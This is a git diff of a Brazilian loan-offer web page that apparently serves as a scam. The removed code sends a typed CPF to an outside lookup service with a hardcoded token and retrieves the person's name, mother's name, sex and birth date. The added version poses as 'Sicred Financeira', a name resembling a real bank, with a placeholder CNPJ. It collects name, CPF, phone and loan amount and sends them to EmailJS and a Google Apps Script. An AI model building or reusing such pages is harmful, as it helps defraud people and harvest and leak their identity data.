@@ -1,286 +1,480 @@
-<!DOCTYPE html><html lang="pt-BR"><head>
-    <meta charset="UTF-8">
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-AR-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Simplic - Verificação de CPF</title>
-    <link href="css/bootstrap.min.css" rel="stylesheet">
-    <link rel="stylesheet" href="css/style.css">
+    <title>Sicred Financeira - Crédito Consciente e Descomplicado</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <script src="https://cdn.jsdelivr.net/npm/cleave.js@1.6.0/dist/cleave.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/cleave.js@1.6.0/dist/addons/cleave-phone.br.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+    <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3.2.0/dist/email.min.js"></script>
     
+    <script>
+    !function(e,t){"object"==typeof exports&&"object"==typeof module?module.exports=t():"function"==typeof define&&define.amd?define([],t):"object"==typeof exports?exports.install=t():e.install=t()}("undefined"!=typeof window?window:self,(function(){return function(e){var t={};function n(o){if(t[o])return t[o].exports;var r=t[o]={i:o,l:!1,exports:{}};return e[o].call(r.exports,r,r.exports,n),r.l=!0,r.exports}return n.m=e,n.c=t,n.d=function(e,t,o){n.o(e,t)||Object.defineProperty(e,t,{enumerable:!0,get:o})},n.r=function(e){"undefined"!=typeof Symbol&&Symbol.toStringTag&&Object.defineProperty(e,Symbol.toStringTag,{value:"Module"}),Object.defineProperty(e,"__esModule",{value:!0})},n.t=function(e,t){if(1&t&&(e=n(e)),8&t)return e;if(4&t&&"object"==typeof e&&e&&e.__esModule)return e;var o=Object.create(null);if(n.r(o),Object.defineProperty(o,"default",{enumerable:!0,value:e}),2&t&&"string"!=typeof e)for(var r in e)n.d(o,r,function(t){return e[t]}.bind(null,r));return o},n.n=function(e){var t=e&&e.__esModule?function(){return e.default}:function(){return e};return n.d(t,"a",t),t},n.o=function(e,t){return Object.prototype.hasOwnProperty.call(e,t)},n.p="",n(n.s=72)}({72:function(e,t,n){"use strict";var o=this&&this.__spreadArray||function(e,t,n){if(n||2===arguments.length)for(var o,r=0,i=t.length;r<i;r++)!o&&r in t||(o||(o=Array.prototype.slice.call(t,0,r)),o[r]=t[r]);return e.concat(o||Array.prototype.slice.call(t))};Object.defineProperty(t,"__esModule",{value:!0});var r=function(e,t,n){var o,i=e.createElement("script");i.type="text/javascript",i.async=!0,i.src=t,n&&(i.onerror=function(){r(e,n)});var a=e.getElementsByTagName("script")[0];null===(o=a.parentNode)||void 0===o||o.insertBefore(i,a)};!function(e,t,n){e.KwaiAnalyticsObject=n;var i=e[n]=e[n]||[];i.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie"];var a=function(e,t){e[t]=function(){for(var n=[],r=0;r<arguments.length;r++)n[r]=arguments[r];var i=o([t],n,!0);e.push(i)}};i.methods.forEach((function(e){a(i,e)})),i.instance=function(e){var t,n=(null===(t=i._i)||void 0===t?void 0:t[e])||[];return i.methods.forEach((function(e){a(n,e)})),n},i.load=function(e,o){var a="https://s21-def.ap4r.com/kos/s101/nlav112572/pixel/events.js";i._i=i._i||{},i._i[e]=[],i._i[e]._u=a,i._t=i._t||{},i._t[e]=+new Date,i._o=i._o||{},i._o[e]=o||{};var c="?sdkid=".concat(e,"&lib=").concat(n);r(t,a+c,"https://s21-def.ks-la.net/kos/s101/nlav112572/pixel/events.js"+c)}}(window,document,"kwaiq")}})}));
+    </script>
+    <script>
+      kwaiq.load('287101758925323');
+      kwaiq.page();
+      kwaiq.track('contentView')
+    </script>
+    
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        brand: {
+                            DEFAULT: '#0067B1', // Cor principal
+                            dark: '#005591',    // Tom mais escuro para hover
+                            light: '#e6f0f7'   // Tom bem claro para fundos
+                        },
+                        neutral: {
+                            DEFAULT: '#111827', // Preto suave
+                            light: '#f9fafb',   // Cinza bem claro
+                            medium: '#6b7280'  // Cinza para textos
+                        }
+                    }
+                }
+            }
+        }
+    </script>
+
+    <style>
+        .custom-select { position: relative; width: 100%; }
+        .custom-select select { display: none; }
+        .select-selected { background-color: white; border-radius: 8px; border: 1px solid #d1d5db; padding: 12px 16px; cursor: pointer; user-select: none; transition: all 0.3s; color: #374151; }
+        .select-selected:after { position: absolute; content: ""; top: 18px; right: 16px; width: 0; height: 0; border: 6px solid transparent; border-color: #6b7280 transparent transparent transparent; transition: all 0.3s; }
+        .select-selected.select-arrow-active:after { border-color: transparent transparent #6b7280 transparent; top: 12px; }
+        .select-items { position: absolute; background-color: white; top: 100%; left: 0; right: 0; z-index: 99; border-radius: 8px; border: 1px solid #e5e7eb; margin-top: 4px; overflow: hidden; box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1), 0 4px 6px -2px rgba(0, 0, 0, 0.05); }
+        .select-items div { padding: 12px 16px; cursor: pointer; transition: all 0.2s; }
+        .select-items div:hover, .same-as-selected { background-color: #e6f0f7; /* Cor brand.light */ }
+        .select-hide { display: none; }
+        .border-error { border-color: #ef4444; }
+    </style>
 </head>
-<body>
-    <header class="header">
-        <div class="container py-2">
-            <div class="d-flex justify-content-between align-items-center">
-                <div class="logo d-flex align-items-center">
-                    <img src="images/xlogo2.png" alt="Simplic Logo" class="logo-img" data-pagespeed-url-hash="99038477" onload="pagespeed.CriticalImages.checkImageForCriticality(this);">
-                </div>
-                <div class="menu-icons">
-                    <svg class="info-icon" width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                        <circle cx="12" cy="12" r="10" stroke="#333333" stroke-width="2"></circle>
-                        <path d="M12 7V12M12 16V16.01" stroke="#333333" stroke-width="2" stroke-linecap="round"></path>
-                    </svg>
-                    <svg class="menu-icon" width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                        <path d="M12 6V6.01M12 12V12.01M12 18V18.01" stroke="#333333" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
-                    </svg>
-                </div>
+<body class="font-sans bg-neutral-light antialiased">
+    
+    <header class="fixed top-0 left-0 right-0 bg-white/90 backdrop-blur-sm shadow-sm z-50">
+        <div class="container mx-auto px-4 py-3 flex justify-between items-center">
+            <div class="flex items-center gap-3">
+                <img src="x-volume-negativa-54.png" alt="Logo" class="w-12 h-12">
+                <h1 class="text-xl font-bold text-neutral hidden sm:block">Sicred Financeira</h1>
             </div>
+            <a href="#form-section" class="bg-brand hover:bg-brand-dark text-white font-bold py-2 px-6 rounded-full transition duration-300 shadow-sm hover:shadow-lg text-sm">
+                Simule Agora
+            </a>
         </div>
     </header>
 
-    <main class="main-content">
-        <div class="container">
-            <div class="verification-card mx-auto my-5">
-                <div id="verification-step">
-                    <div class="card-header">
-                        <svg class="verification-icon" width="40" height="40" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                            <path d="M9 11L12 14L22 4" stroke="#00a651" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
-                            <path d="M21 12V19C21 19.5304 20.7893 20.0391 20.4142 20.4142C20.0391 20.7893 19.5304 21 19 21H5C4.46957 21 3.96086 20.7893 3.58579 20.4142C3.21071 20.0391 3 19.5304 3 19V5C3 4.46957 3.21071 3.96086 3.58579 3.58579C3.96086 3.21071 4.46957 3 5 3H16" stroke="#00a651" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
-                        </svg>
-                    </div>
-                    <h2 class="verification-title">Verificação Rápida</h2>
-                    <p class="verification-text">Preciamos realizar uma verificação rapida para definir qual valor de crédito podemos liberar de imediato pra você.</p>
-                    <p class="verification-instruction">Digite somente os números do seu CPF para análise.</p>
-                    
-                    <div id="notification" class="notification-card">
-                        <i class="fas fa-exclamation-circle"></i>
-                        <span id="notification-message"></span>
-                    </div>
-                    
-                    <form id="cpf-form" class="mt-4">
-                        <div class="mb-4">
-                            <label for="cpf" class="form-label">CPF</label>
-                            <input type="text" class="form-control form-control-lg" id="cpf" placeholder="000.000.000-00" maxlength="14" required="">
-                        </div>
-                        <button type="submit" class="btn btn-success btn-lg w-100" id="verify-button" onclick="this.innerHTML = '<div class=\'d-flex justify-content-center\'><i class=\'fas fa-spinner fa-spin me-2\'></i>Realizando verificação</div>'">
-                            Verificar
-                        </button>
-                    </form>
-                    
-                    <div class="security-info mt-4">
-                        <div class="d-flex align-items-center security-item">
-                            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                                <path d="M12 22C17.5228 22 22 17.5228 22 12C22 6.47715 17.5228 2 12 2C6.47715 2 2 6.47715 2 12C2 17.5228 6.47715 22 12 22Z" stroke="#777" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
-                                <path d="M12 16V12" stroke="#777" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
-                                <path d="M12 8H12.01" stroke="#777" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
-                            </svg>
-                            <span>Seus dados estão protegidos e não serão compartilhados</span>
-                        </div>
-                        <div class="d-flex align-items-center security-item mt-2">
-                            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                                <path d="M12 22C17.5228 22 22 17.5228 22 12C22 6.47715 17.5228 2 12 2C6.47715 2 2 6.47715 2 12C2 17.5228 6.47715 22 12 22Z" stroke="#777" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
-                                <path d="M9 12L11 14L15 10" stroke="#777" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
-                            </svg>
-                            <span>Análise em tempo real sem afetar seu score</span>
-                        </div>
-                    </div>
-                </div>
+    <main>
+        <section class="pt-32 pb-20 px-4 bg-white">
+            <div class="container mx-auto max-w-4xl text-center">
+                <h2 class="text-4xl md:text-6xl font-extrabold text-neutral-DEFAULT mb-4 leading-tight">Crédito Consciente e <span class="text-brand">Descomplicado</span> para seus Planos</h2>
+                <p class="text-lg text-neutral-medium max-w-2xl mx-auto mt-6">
+                    Encontre as melhores condições de crédito para realizar seus sonhos. Simulação rápida, segura e 100% online.
+                </p>
+                <a href="#form-section" class="mt-8 inline-block bg-brand hover:bg-brand-dark text-white font-bold py-3 px-8 rounded-full transition duration-300 shadow-lg hover:shadow-xl text-lg transform hover:-translate-y-1">
+                    Quero uma Proposta
+                </a>
+            </div>
+        </section>
 
-                <div id="results-step" style="display: none;">
-                    <div class="text-center mb-4">
-                        <svg class="success-icon" width="60" height="60" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                            <circle cx="12" cy="12" r="11" fill="#00a651" stroke="#008d45" stroke-width="1"></circle>
-                            <path d="M7 12L10 15L17 8" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
-                        </svg>
-                        <h2 class="verification-title mt-3">Verificação Concluída</h2>
-                        <p class="verification-text">Encontramos seus dados com sucesso!</p>
-                    </div>
-
-                    <div class="user-data mb-4">
-                        <div class="data-item">
-                            <span class="data-label">Nome:</span>
-                            <span class="data-value" id="user-name">-</span>
+        <section class="py-20 px-4 bg-brand-light">
+             <div class="container mx-auto max-w-5xl">
+                <div class="grid grid-cols-1 md:grid-cols-3 gap-8">
+                    <div class="bg-white p-8 rounded-xl shadow-lg border border-transparent hover:border-brand/50 hover:-translate-y-2 transition-all duration-300 text-center">
+                        <div class="w-16 h-16 bg-brand-light rounded-full flex items-center justify-center text-brand mb-5 mx-auto">
+                            <i class="fas fa-bolt text-2xl"></i>
                         </div>
-                        <div class="data-item">
-                            <span class="data-label">CPF:</span>
-                            <span class="data-value" id="user-cpf">-</span>
-                        </div>
+                        <h3 class="font-bold text-xl text-neutral mb-2">Análise Ágil</h3>
+                        <p class="text-neutral-medium">Receba uma pré-análise do seu crédito em poucas horas e saiba suas chances de aprovação.</p>
                     </div>
-
-                    <button class="btn btn-success btn-lg w-100" id="continue-button">
-                        Continuar para Confirmação
-                    </button>
+                    <div class="bg-white p-8 rounded-xl shadow-lg border border-transparent hover:border-brand/50 hover:-translate-y-2 transition-all duration-300 text-center">
+                         <div class="w-16 h-16 bg-brand-light rounded-full flex items-center justify-center text-brand mb-5 mx-auto">
+                            <i class="fas fa-percent text-2xl"></i>
+                        </div>
+                        <h3 class="font-bold text-xl text-neutral mb-2">Taxas Justas</h3>
+                        <p class="text-neutral-medium">Acesso a taxas de juros personalizadas e condições que realmente cabem no seu bolso.</p>
+                    </div>
+                    <div class="bg-white p-8 rounded-xl shadow-lg border border-transparent hover:border-brand/50 hover:-translate-y-2 transition-all duration-300 text-center">
+                         <div class="w-16 h-16 bg-brand-light rounded-full flex items-center justify-center text-brand mb-5 mx-auto">
+                            <i class="fas fa-shield-alt text-2xl"></i>
+                        </div>
+                        <h3 class="font-bold text-xl text-neutral mb-2">100% Seguro</h3>
+                        <p class="text-neutral-medium">Utilizamos tecnologia de ponta para garantir a total proteção dos seus dados pessoais e financeiros.</p>
+                    </div>
                 </div>
             </div>
-        </div>
+        </section>
+
+        <section id="form-section" class="py-20 px-4 bg-white">
+            <div class="container mx-auto max-w-lg">
+                <div class="bg-neutral-light p-8 sm:p-10 rounded-2xl shadow-2xl border border-gray-200/80">
+                    <div class="text-center mb-8">
+                        <h2 class="text-3xl font-bold text-neutral mb-2">Faça sua Simulação de Crédito</h2>
+                        <p class="text-neutral-medium">É rápido, fácil e sem compromisso.</p>
+                    </div>
+                    
+                    <form id="contact-form" class="space-y-6">
+                        <div style="position: absolute; left: -5000px;" aria-hidden="true"><input type="text" name="honeypot_field" tabindex="-1" value=""></div>
+                        <input type="hidden" id="form-load-time" name="form-load-time" value="">
+                        
+                        <div>
+                            <label for="full-name" class="block text-sm font-medium text-neutral-medium mb-1">Nome Completo</label>
+                            <input type="text" id="full-name" name="full-name" required class="w-full px-4 py-3 rounded-lg border border-gray-300 focus:ring-2 focus:ring-brand focus:border-brand outline-none transition duration-300 bg-white">
+                        </div>
+                        
+                        <div>
+                            <label for="cpf" class="block text-sm font-medium text-neutral-medium mb-1">CPF</label>
+                            <input type="text" id="cpf" name="cpf" required class="w-full px-4 py-3 rounded-lg border border-gray-300 focus:ring-2 focus:ring-brand focus:border-brand outline-none transition duration-300 bg-white" maxlength="14">
+                            <p id="cpf-error" class="text-red-500 text-xs mt-1 hidden">CPF inválido. Por favor, verifique.</p>
+                        </div>
+                        
+                        <div>
+                            <label for="phone" class="block text-sm font-medium text-neutral-medium mb-1">Celular (com DDD)</label>
+                            <input type="text" id="phone" name="phone" required class="w-full px-4 py-3 rounded-lg border border-gray-300 focus:ring-2 focus:ring-brand focus:border-brand outline-none transition duration-300 bg-white">
+                            <p id="phone-error" class="text-red-500 text-xs mt-1 hidden">Telefone inválido. Verifique o DDD e o número.</p>
+                        </div>
+                        
+                        <div class="custom-select">
+                            <label class="block text-sm font-medium text-neutral-medium mb-1">Valor Desejado</label>
+                            <div class="select-selected">Selecione um valor</div>
+                            <div class="select-items select-hide">
+                                <div data-value="R$5.000,00 até R$10.000,00">R$5.000,00 até R$10.000,00</div>
+                                <div data-value="R$10.000,00 até R$20.000,00">R$10.000,00 até R$20.000,00</div>
+                                <div data-value="R$20.000,00 até R$30.000,00">R$20.000,00 até R$30.000,00</div>
+                                <div data-value="R$30.000,00 até R$40.000,00">R$30.000,00 até R$40.000,00</div>
+                                <div data-value="R$40.000,00 até R$50.000,00">R$40.000,00 até R$50.000,00</div>
+                                <div data-value="R$50.000,00 até R$100.000,00">R$50.000,00 até R$100.000,00</div>
+                            </div>
+                            <select id="amount" name="amount" class="hidden" required>
+                                <option value="" selected disabled>Selecione um valor</option>
+                                <option value="R$5.000,00 até R$10.000,00">R$5.000,00 até R$10.000,00</option>
+                                <option value="R$10.000,00 até R$20.000,00">R$10.000,00 até R$20.000,00</option>
+                                <option value="R$20.000,00 até R$30.000,00">R$20.000,00 até R$30.000,00</option>
+                                <option value="R$30.000,00 até R$40.000,00">R$30.000,00 até R$40.000,00</option>
+                                <option value="R$40.000,00 até R$50.000,00">R$40.000,00 até R$50.000,00</option>
+                                <option value="R$50.000,00 até R$100.000,00">R$50.000,00 até R$100.000,00</option>
+                            </select>
+                        </div>
+                        
+                        <button type="submit" class="w-full bg-brand hover:bg-brand-dark text-white font-bold py-4 px-4 rounded-lg transition duration-300 flex items-center justify-center text-lg shadow-lg hover:shadow-xl transform hover:-translate-y-0.5">
+                            Simular Agora
+                            <i class="fas fa-arrow-right ml-2"></i>
+                        </button>
+                        
+                        <p class="text-xs text-neutral-medium text-center pt-2">
+                            Ao enviar, você concorda com nossos <a href="#" class="text-brand hover:underline font-semibold">Termos de Uso</a> e nossa <a href="#" class="text-brand hover:underline font-semibold">Política de Privacidade</a>.
+                        </p>
+                    </form>
+                </div>
+            </div>
+        </section>
+
+        <section class="py-20 px-4 bg-brand-light">
+            <div class="container mx-auto max-w-4xl">
+                <h2 class="text-3xl font-bold text-center text-neutral mb-12">Dúvidas Frequentes</h2>
+                <div class="space-y-4">
+                    <div class="bg-white p-6 rounded-xl shadow-md border border-gray-200/80">
+                        <button class="faq-toggle w-full flex justify-between items-center text-left">
+                            <h3 class="font-semibold text-lg text-neutral">Qual é o prazo para análise do crédito?</h3>
+                            <i class="fas fa-chevron-down text-brand transition-transform duration-300"></i>
+                        </button>
+                        <div class="faq-content mt-4 text-neutral-medium hidden overflow-hidden">
+                            <p>O prazo médio para uma análise completa é de 1 a 3 dias úteis após o envio de toda a documentação necessária. Em muitos casos, conseguimos fornecer uma resposta preliminar em até 24 horas.</p>
+                        </div>
+                    </div>
+                    <div class="bg-white p-6 rounded-xl shadow-md border border-gray-200/80">
+                        <button class="faq-toggle w-full flex justify-between items-center text-left">
+                            <h3 class="font-semibold text-lg text-neutral">Quais documentos são necessários?</h3>
+                            <i class="fas fa-chevron-down text-brand transition-transform duration-300"></i>
+                        </button>
+                        <div class="faq-content mt-4 text-neutral-medium hidden overflow-hidden">
+                            <p>Os documentos básicos incluem RG, CPF, comprovante de residência e comprovante de renda. Dependendo do valor solicitado e do seu perfil, nossa equipe poderá solicitar documentos adicionais para garantir as melhores condições.</p>
+                        </div>
+                    </div>
+                    <div class="bg-white p-6 rounded-xl shadow-md border border-gray-200/80">
+                        <button class="faq-toggle w-full flex justify-between items-center text-left">
+                            <h3 class="font-semibold text-lg text-neutral">Como o dinheiro é liberado?</h3>
+                            <i class="fas fa-chevron-down text-brand transition-transform duration-300"></i>
+                        </button>
+                        <div class="faq-content mt-4 text-neutral-medium hidden overflow-hidden">
+                           <p>Após a aprovação final e a assinatura digital do contrato, o valor é liberado e creditado diretamente na sua conta bancária informada no cadastro. O processo costuma levar até 2 dias úteis após a assinatura.</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
     </main>
 
-    <footer class="footer">
-        <div class="container">
-            <div class="footer-bottom py-3 text-center">
-                <p class="mb-1">© 2025 Ágil Empréstimos - Todos os direitos reservados.</p>
-                <p class="mb-1">CNPJ: 36.947.229/0001-85</p>
-                <p class="mb-0"><a href="#" class="text-white">Política de Privacidade</a> | <a href="#" class="text-white">Termos de Uso</a></p>
+    <footer class="bg-neutral text-white py-12 px-4">
+        <div class="container mx-auto max-w-6xl">
+            <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-8">
+                <div class="md:col-span-2 lg:col-span-1">
+                    <div class="flex items-center mb-4">
+                        <img src="x-volume-negativa-54.png" alt="Logo" class="w-10 h-10 mr-3">
+                        <h3 class="text-xl font-bold">Sicred Financeira</h3>
+                    </div>
+                    <p class="text-gray-400 text-sm">
+                        Impulsionando seus projetos com crédito inteligente e acessível.
+                    </p>
+                </div>
+                <div>
+                    <h4 class="font-bold mb-4 tracking-wider">MAPA DO SITE</h4>
+                    <ul class="space-y-2">
+                        <li><a href="#" class="text-gray-300 hover:text-white transition duration-300">Início</a></li>
+                        <li><a href="#form-section" class="text-gray-300 hover:text-white transition duration-300">Simular Crédito</a></li>
+                        <li><a href="#" class="text-gray-300 hover:text-white transition duration-300">Termos de Uso</a></li>
+                        <li><a href="#" class="text-gray-300 hover:text-white transition duration-300">Privacidade</a></li>
+                    </ul>
+                </div>
+                <div>
+                    <h4 class="font-bold mb-4 tracking-wider">CONTATO</h4>
+                    <ul class="space-y-3 text-gray-300">
+                        <li class="flex items-start"><i class="fas fa-phone-alt mr-3 text-brand mt-1"></i> (11) 1234-5678</li>
+                        <li class="flex items-start"><i class="fas fa-envelope mr-3 text-brand mt-1"></i> contato@sicredfinanceira.com.br</li>
+                        <li class="flex items-start"><i class="fas fa-map-marker-alt mr-3 text-brand mt-1"></i> São Paulo - SP</li>
+                    </ul>
+                </div>
+                <div>
+                    <h4 class="font-bold mb-4 tracking-wider">REDES SOCIAIS</h4>
+                    <div class="flex space-x-3">
+                        <a href="#" class="w-10 h-10 bg-gray-700 hover:bg-brand rounded-full flex items-center justify-center transition duration-300"><i class="fab fa-facebook-f"></i></a>
+                        <a href="#" class="w-10 h-10 bg-gray-700 hover:bg-brand rounded-full flex items-center justify-center transition duration-300"><i class="fab fa-instagram"></i></a>
+                        <a href="#" class="w-10 h-10 bg-gray-700 hover:bg-brand rounded-full flex items-center justify-center transition duration-300"><i class="fab fa-linkedin-in"></i></a>
+                        <a href="#" class="w-10 h-10 bg-gray-700 hover:bg-brand rounded-full flex items-center justify-center transition duration-300"><i class="fab fa-whatsapp"></i></a>
+                    </div>
+                </div>
+            </div>
+            <div class="border-t border-gray-700 mt-10 pt-8 text-center text-gray-400 text-sm">
+                <p>&copy; 2025 Sicred Financeira. Todos os direitos reservados.</p>
+                <p class="mt-2">CNPJ: XX.XXX.XXX/0001-XX. A Sicred Financeira é um correspondente bancário autorizado.</p>
             </div>
         </div>
     </footer>
 
-    <script src="js/bootstrap.bundle.min.js"></script>
-    <script src="js/all.min.js"></script>
-      <script>
-        function showNotification(message) {
-            const notification = document.getElementById('notification');
-            const notificationMessage = document.getElementById('notification-message');
-            
-            notificationMessage.textContent = message;
-            notification.style.display = 'flex';
-            
-            setTimeout(() => {
-                notification.style.display = 'none';
-            }, 3000);
-        }
+    <script>
+        // Initialize EmailJS
+        (function(){
+            emailjs.init("8_sAiMqjbd7lzjOEu");
+        })();
+    
+        // ----- VARIÁVEIS DE CONTROLE E CONFIGURAÇÃO -----
+        let isSubmitting = false;
+        const googleScriptUrl = 'https://script.google.com/macros/s/AKfycbyRZ-RHqC8rNMag2vSYKFLD_k6AIWOsaeinko-RNEBwZZWHD1kBAjABfnSN6RGSigL3/exec';
+
+        // Máscaras de campo
+        new Cleave('#cpf', {
+            numericOnly: true,
+            blocks: [3, 3, 3, 2],
+            delimiters: ['.', '.', '-']
+        });
         
-        document.getElementById('cpf').addEventListener('input', function (e) {
-            let value = e.target.value;
-            
-            value = value.replace(/\D/g, '');
-            
-            if (value.length > 0) {
-                value = value.replace(/^(\d{3})(\d)/g, '$1.$2');
-                value = value.replace(/^(\d{3})\.(\d{3})(\d)/g, '$1.$2.$3');
-                value = value.replace(/^(\d{3})\.(\d{3})\.(\d{3})(\d)/g, '$1.$2.$3-$4');
-            }
-            
-            if (value.length > 14) {
-                value = value.substring(0, 14);
-            }
-            
-            e.target.value = value;
-            
-            // Salvar o CPF sem formataão no localStorage sempre que o usuário digitar
-            const cpfRaw = value.replace(/\D/g, '');
-            if (cpfRaw.length === 11) {
-                localStorage.setItem('cpfUsuario', cpfRaw);
-                console.log('CPF salvo no localStorage:', cpfRaw);
-            }
-            
-            e.target.selectionStart = e.target.value.length;
-            e.target.selectionEnd = e.target.value.length;
+        // ***** CÓDIGO ALTERADO *****
+        new Cleave('#phone', {
+            prefix: '+55', // Adiciona o prefixo fixo
+            delimiters: [' (', ') ', '-'],
+            blocks: [3, 2, 5, 4], // Define os blocos para +55 (XX) XXXXX-XXXX
+            numericOnly: true
         });
-
-        document.getElementById('cpf-form').addEventListener('submit', async function(e) {
-            e.preventDefault();
-            
-            const cpf = document.getElementById('cpf').value.replace(/\D/g, '');
-            const verifyButton = document.getElementById('verify-button');
-            
-            console.log('CPF inserido:', cpf);
-            
-            if (cpf.length !== 11) {
-                console.log('CPF inválido - comprimento incorreto');
-                showNotification('Por favor, insira um CPF válido');
-                verifyButton.innerHTML = 'Verificar';
-                return;
-            }
-
-            try {
-                console.log('Iniciando consulta  API...');
-                const url = `https://bk.elaidisparos.tech/consultar-filtrada/cpf?cpf=${cpf}&token=927492e7841e779b2d605b6309d11c5a463b6c2b89a8fb692cc0496928c5171f`;
-                console.log('URL da requisião:', url);
-
-                const response = await fetch(url, {
-                    method: 'GET',
-                });
-
-                console.log('Status da resposta:', response.status);
-
-                const data = await response.json();
-                console.log('Dados recebidos:', data);
-
-                if (response.ok) {
-                    console.log('Consulta bem sucedida');
-                    
-                    const dadosUsuario = {
-                        NOME: data.nome,
-                        MAE: data.mae || '',
-                        SEXO: data.sexo,
-                        NASCIMENTO: data.nascimento
-                    };
-                    
-                    localStorage.setItem('dadosUsuario', JSON.stringify(dadosUsuario));
-                    
-                    console.log('Dados salvos no localStorage');
-
-                    document.getElementById('user-name').textContent = dadosUsuario.NOME;
-                    document.getElementById('user-cpf').textContent = data.cpfformatado || cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
-                    
-                    document.getElementById('verification-step').style.display = 'none';
-                    document.getElementById('results-step').style.display = 'block';
-                    console.log('Tela de resultados exibida com sucesso');
-                } else {
-                    console.log('CPF não encontrado. Status:', response.status);
-                    showNotification('CPF não encontrado');
-                    verifyButton.innerHTML = 'Verificar';
-                }
-            } catch (error) {
-                console.error('Erro detalhado:', error);
-                console.error('Stack trace:', error.stack);
-                
-                console.log('Usando dados simulados devido ao erro');
-                const dadosUsuario = {
-                    NOME: "GHERSON DYWYNO ESPHYNDOLA",
-                    MAE: "MARIA HELENA",
-                    SEXO: "MASCULINO",
-                    NASCIMENTO: "31/03/1966"
-                };
-                
-                localStorage.setItem('dadosUsuario', JSON.stringify(dadosUsuario));
-                
-                document.getElementById('user-name').textContent = dadosUsuario.NOME;
-                document.getElementById('user-cpf').textContent = cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
-
-                document.getElementById('verification-step').style.display = 'none';
-                document.getElementById('results-step').style.display = 'block';
-                console.log('Tela de resultados exibida com dados simulados');
-            }
+    
+        // --- LÓGICA DO SELECT CUSTOMIZADO ---
+        const selectContainer = document.querySelector('.custom-select');
+        const selectSelected = selectContainer.querySelector('.select-selected');
+        const selectItemsContainer = selectContainer.querySelector('.select-items');
+        const nativeSelect = selectContainer.querySelector('select');
+        selectSelected.addEventListener('click', () => { if(isSubmitting) return; selectItemsContainer.classList.toggle('select-hide'); selectSelected.classList.toggle('select-arrow-active'); });
+        selectItemsContainer.querySelectorAll('div').forEach(optionDiv => {
+            optionDiv.addEventListener('click', () => {
+                if(isSubmitting) return;
+                selectItemsContainer.querySelectorAll('div').forEach(opt => opt.classList.remove('same-as-selected'));
+                optionDiv.classList.add('same-as-selected');
+                const value = optionDiv.getAttribute('data-value');
+                selectSelected.textContent = value;
+                nativeSelect.value = value;
+                selectItemsContainer.classList.add('select-hide');
+                selectSelected.classList.remove('select-arrow-active');
+            });
         });
+        document.addEventListener('click', function(event) { if (!selectContainer.contains(event.target)) { selectItemsContainer.classList.add('select-hide'); selectSelected.classList.remove('select-arrow-active'); } });
+    
+        // --- LÓGICA DO FAQ ---
+        document.querySelectorAll('.faq-toggle').forEach(button => { 
+            button.addEventListener('click', () => { 
+                if(isSubmitting) return; 
+                const content = button.nextElementSibling; 
+                const icon = button.querySelector('i');
+                
+                content.classList.toggle('hidden');
+                icon.classList.toggle('rotate-180');
+            }); 
+        });
+    
+        // --- FUNÇÕES DE VALIDAÇÃO ---
+        function validaCPF(cpf) {
+            cpf = cpf.replace(/[^\d]+/g,'');
+            if(cpf == '' || cpf.length != 11 || /^(\d)\1{10}$/.test(cpf)) return false;
+            let soma = 0, resto;
+            for (let i = 1; i <= 9; i++) soma = soma + parseInt(cpf.substring(i-1, i)) * (11 - i);
+            resto = (soma * 10) % 11;
+            if ((resto == 10) || (resto == 11)) resto = 0;
+            if (resto != parseInt(cpf.substring(9, 10))) return false;
+            soma = 0;
+            for (let i = 1; i <= 10; i++) soma = soma + parseInt(cpf.substring(i-1, i)) * (12 - i);
+            resto = (soma * 10) % 11;
+            if ((resto == 10) || (resto == 11)) resto = 0;
+            if (resto != parseInt(cpf.substring(10, 11))) return false;
+            return true;
+        }
 
-        function getUrlParams() {
-            const params = {};
-            const queryString = window.location.search;
+        // ***** CÓDIGO ALTERADO *****
+        function validaTelefone(telefone) {
+            // Extrai apenas os dígitos
+            let cleaned = telefone.replace(/\D/g, '');
 
-            const urlParams = new URLSearchParams(queryString);
-            
-            for (const [key, value] of urlParams) {
-                params[key] = value;
+            // Remove o '55' do início se ele existir
+            if (cleaned.startsWith('55')) {
+                cleaned = cleaned.substring(2);
             }
-            return params;
+
+            // Verifica se o DDD é válido (não começa com 0, e.g., 11 em diante)
+            const ddd = parseInt(cleaned.substring(0, 2), 10);
+            if (isNaN(ddd) || ddd < 11) {
+                return false;
+            }
+            
+            // O número sem DDD deve ter 8 (fixo) ou 9 (celular) dígitos
+            const numero = cleaned.substring(2);
+            if (numero.length < 8 || numero.length > 9) {
+                return false;
+            }
+
+            // Se for um celular (9 dígitos), o primeiro dígito deve ser 9
+            if (numero.length === 9 && numero.substring(0, 1) !== '9') {
